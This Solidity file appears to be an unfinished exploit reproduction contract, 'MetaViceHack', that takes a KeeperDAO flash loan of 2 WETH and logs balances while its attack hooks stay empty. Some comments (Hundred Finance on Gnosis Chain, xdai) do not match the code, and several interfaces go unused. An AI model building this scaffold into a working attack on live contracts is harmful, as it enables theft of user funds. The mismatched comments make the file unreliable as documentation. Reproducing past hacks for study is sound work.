pragma solidity ^0.8.0;

import "../src/flashloan/FlashLoan.sol";
import "../src/reentrancy/Reentrancy.sol";
import "../src/tokens/Tokens.sol";

import "forge-std/interfaces/IERC20.sol";
import "forge-std/console.sol";

contract MetaViceHack is FlashLoan, Reentrancy, Tokens {
    // Hundred Finance Markets on Gnosis Chain
    IERC20 constant metaVice = IERC20(0x5375fd52707AB7C8d1B088e07169fA74B0999732);

    function initiateAttack() external {
        console.log("WETH balance before:", EthereumTokens.WETH.balanceOf(address(this)));
        takeFlashLoan(FlashLoanProviders.KEEPERDAO, address(EthereumTokens.WETH), 2 ether);
        console.log("WETH balance after:", EthereumTokens.WETH.balanceOf(address(this)));
    }

    function _executeAttack() internal override(FlashLoan, Reentrancy) {
        if (currentFlashLoanProvider() == FlashLoanProviders.KEEPERDAO) {
            console.log("WETH balance after flashloan: ", EthereumTokens.WETH.balanceOf(address(this)));
        }
    }

    function _completeAttack() internal override(FlashLoan, Reentrancy) {

    }

    // Our contract needs to implement this function to be able to receive Gnosis chain's native asset, xdai
    receive() external payable override {}

    function _reentrancyCallback() internal override {
        // Overrided to silence the console log
        _executeAttack();
    }

    fallback() external payable override(FlashLoan, Reentrancy) {
        // Default to the flash loan fallback logic
        FlashLoan._fallback();
    }
}

interface ICompoundToken {
    function borrow(uint256) external;
    function mint(uint256) external;
    function comptroller() external view returns (address);
}

interface IWETH {
    function deposit() external payable;
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
}
